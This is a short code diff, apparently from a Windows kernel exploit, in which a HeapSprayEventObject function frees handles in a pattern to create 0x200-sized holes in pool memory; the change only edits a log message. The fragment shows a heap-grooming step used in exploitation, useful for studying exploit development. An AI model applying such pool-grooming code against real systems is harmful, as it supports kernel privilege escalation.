@@ -63,7 +63,7 @@ static NTSTATUS HeapSprayEventObject() {
 		}
 	}
 
-	std::cout << "[+] Creating holes in sizes 0x200" << std::endl;
+	std::cout << "[+] Creating holes in sizes 0x200..." << std::endl;
 	for (int i = 0; i < second.size(); i+=16) {
 		for (int j = 0; j < 8; j++) {
 			CloseHandle(second[i + j]);
